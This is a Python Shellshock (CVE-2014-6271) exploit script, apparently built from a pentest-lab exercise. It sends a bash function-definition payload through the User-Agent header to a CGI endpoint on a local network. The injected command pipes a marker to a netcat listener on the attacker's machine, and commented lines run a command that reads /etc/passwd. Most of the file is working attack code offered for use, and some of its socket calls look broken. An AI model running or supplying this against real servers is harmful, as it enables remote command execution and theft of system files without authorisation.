#import http.client
#Reference: https://pentesterlab.com/exercises/cve-2014-6271/course
import requests
import time
import sockets
from thread_decorator import run_as_thread

EXPLOIT1='() { :;};%s'
EXPLOIT2='() { _; } >_[$($())] { %s; }'

TIMEOUT=3
TEST_MSG = "VULNERABLE"

HOST_IP = "192.168.1.89"
HOST_PORT = 9999
#@run_as_thread
#data_sock = sockets.LocalSocket()
#data_sock.bind("192.168.1.89", 9999).join()
class shellshock_listener():
    def __init__(self, HOST_IP, HOST_PORT):
        self.ip = HOST_IP
        self.port = HOST_PORT
        self.data_sock = sockets.LocalSocket()
        self.data_sock.bind(self.ip, self.port)
        self.vuln_list = []
        self.vuln_index = 0

    def clear(self):
        self.vuln_list = []

    @run_as_thread
    def recv(self, URL, expected_msg):
        print("Listening!")
        self.data_sock.accept()
        #global data_sock
        #while data_sock is None:
        #	print("waiting..")


        msg = self.data_sock.recv(len(expected_msg)).decode("ascii")
        print(msg)
        if msg == expected_msg:
          self.vuln_list.append(URL)
        

    def exploit(self, URL, command, timeout=None):
        # print >> sys.stderr, "Connecting to %s - %s" %(target_host, cgi_path)

        shellcode=EXPLOIT1 % command

        headers = {"User-Agent": shellcode}
        start = time.time()
        #conn.request("GET", path, headers=headers)
        #res = conn.getresponse()
        try:
            res = requests.get(URL, headers=headers, timeout=timeout)
        except:
            print("Timed out")


    def shellshock_test(self, URL):
        msg = TEST_MSG + str(self.vuln_index)
        listener.recv(URL, msg)
        print("Sending exploit")
        self.exploit(URL, 'echo "'+str(msg)+'" | /usr/bin/nc ' + self.ip + ' ' + str(self.port), TIMEOUT)
        self.vuln_index += 1


if __name__ == "__main__":

    listener = shellshock_listener(HOST_IP, HOST_PORT)
    listener.shellshock_test("http://192.168.1.116/cgi-bin/status/status.cgi")
    listener.shellshock_test("http://192.168.1.116/cgi-bin/status/status.cgi")
    listener.shellshock_test("http://192.168.1.116/cgi-bin/status/status.cgi")
    print(listener.vuln_list)
    print("Done!")


#echo \$(</etc/passwd)
#exploit('http://192.168.1.116/cgi-bin/status/status.cgi', "echo \$(</etc/passwd)")